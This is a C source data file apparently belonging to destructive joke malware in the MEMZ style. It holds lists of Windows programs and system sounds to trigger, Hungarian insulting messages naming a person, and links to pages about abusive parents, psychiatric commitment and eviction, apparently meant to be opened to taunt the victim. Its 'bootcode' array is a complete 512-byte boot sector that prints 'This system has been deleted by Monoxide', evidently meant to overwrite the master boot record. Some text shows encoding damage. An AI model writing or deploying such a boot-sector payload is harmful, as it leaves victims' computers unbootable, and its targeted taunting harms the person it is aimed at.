#include "data.h"

const char* prog[]{
	"calc",
	"explorer",
	"mspaint",
	"notepad",
	"control,"
};
const size_t nprog = sizeof(prog) / sizeof(void*);
const char* message[] = {
	"LOL",
	"Kurva anyj�t",
	"h�lye t�v�",
	"AKADOZIK!! ne rugdosd azt a szart",
	"MOST AZONNAL ELZ�ROD!!",
	"hogy vagy ilyen h�lye??",
	"n�zzel �gy r�m oszt r�h�gj�l,\nm�sz a dilih�zba",
	"Lil�ra vernek ha m�gegyszer t�nkre teszem a g�pet",
	"bassza meg a kurva jo isten az eget m�g m�mma",
	"Toth Ferenc",
};
const size_t nmessage = sizeof(message) / sizeof(void*);
const char* sounds[] = {
	"SystemHand",
	"SystemQuestion",
	"SystemExclamation"
};
const size_t nSounds = sizeof(sounds) / sizeof(void*);
const unsigned char bootcode[] = {
0x31, 0xC0, 0x8E, 0xD8, 0x8E, 0xC0, 0x8E, 0xE0, 0x8E, 0xE8, 0x8E, 0xD0, 0x66, 0xBC, 0x00, 0x7C,
0x00, 0x00, 0x66, 0x89, 0xE5, 0xEA, 0x1A, 0x7C, 0x00, 0x00, 0x30, 0xE4, 0xB0, 0x13, 0xCD, 0x10,
0x0F, 0x31, 0xA3, 0xA9, 0x7C, 0xE8, 0x24, 0x00, 0xB8, 0x00, 0xA0, 0x8E, 0xC0, 0xBF, 0xFF, 0xF9,
0xB1, 0x20, 0xEB, 0x44, 0x89, 0xD8, 0xC1, 0xE0, 0x07, 0x31, 0xC3, 0x89, 0xD8, 0xC1, 0xE8, 0x09,
0x31, 0xC3, 0x89, 0xD8, 0xC1, 0xE0, 0x08, 0x31, 0xC3, 0x89, 0xD8, 0xC3, 0xB4, 0x02, 0x30, 0xFF,
0x30, 0xD2, 0xCD, 0x10, 0xBE, 0xAB, 0x7C, 0xAC, 0x08, 0xC0, 0x74, 0x15, 0x50, 0x8B, 0x1E, 0xA9,
0x7C, 0xE8, 0xD0, 0xFF, 0x31, 0x06, 0xA9, 0x7C, 0x88, 0xC3, 0x58, 0xB4, 0x0E, 0xCD, 0x10, 0xEB,
0xE6, 0xFE, 0xC6, 0x74, 0x02, 0xEB, 0xD5, 0xC3, 0x8B, 0x1E, 0xA9, 0x7C, 0xE8, 0xB5, 0xFF, 0x31,
0x06, 0xA9, 0x7C, 0x31, 0xD2, 0xBB, 0x03, 0x00, 0xF7, 0xF3, 0x89, 0xD0, 0x00, 0xC8, 0x26, 0x88,
0x05, 0x4F, 0x83, 0xFF, 0xFF, 0x75, 0xE1, 0xBF, 0xFF, 0xF9, 0x80, 0xF9, 0x33, 0x7F, 0x04, 0xFE,
0xC1, 0xEB, 0xD5, 0xFE, 0xC5, 0xB1, 0x20, 0xEB, 0xCF, 0x00, 0x10, 0x54, 0x68, 0x69, 0x73, 0x20,
0x73, 0x79, 0x73, 0x74, 0x65, 0x6D, 0x20, 0x68, 0x61, 0x73, 0x20, 0x62, 0x65, 0x65, 0x6E, 0x20,
0x64, 0x65, 0x6C, 0x65, 0x74, 0x65, 0x64, 0x20, 0x62, 0x79, 0x20, 0x4D, 0x6F, 0x6E, 0x6F, 0x78,
0x69, 0x64, 0x65, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x55, 0xAA
};
const char* site[] = {
	"http://www.gyakorikerdesek.hu/csaladi-kapcsolatok__egyeb-kerdesek__4114508-mit-csinaljak-ha-az-apam-mindenert-megvermeg-akar-verni",
	"http://www.gyakorikerdesek.hu/csaladi-kapcsolatok__egyeb-kerdesek__599418-mit-tegyek-ha-apam-alkoholista",
	"http://napidoktor.hu/mozgasban/tippek-sorhas-ellen/",
	"http://www.facebook.com/photo/?fbid=3571257982962147&set=pcb.3571258342962111",
	"http://tiktok.com",
	"http://utcajogasz.hu/szakmai-anyagok/lakhatas-es-lakcim/hasznos-informaciok-kilakoltatassal-veszelyeztetett-embereknek/",
	"http://www.gyakorikerdesek.hu/egeszseg__mentalis-egeszseg__11185883-mi-alapjan-dughatnak-be-valakit-a-dilihazba",
	"http://www.gyakorikerdesek.hu/tini-parkapcsolatok__randizas__9567936-hogyan-szerezzek-baratnot",
	"http://www.gyakorikerdesek.hu/csaladi-kapcsolatok__szulo-gyermek-kapcsolat__5328507-anyam-hulye-mit-tegyek",
	"http://www.gyakorikerdesek.hu/csaladi-kapcsolatok__rokoni-kapcsolat__5284045-a-csaladom-teljesen-kikeszit-idegileg-mit-tegyek",
	"http://www.youtube.com/watch?v=ZyhrYis509A",
};
const size_t nsite = sizeof(site) / sizeof(void*);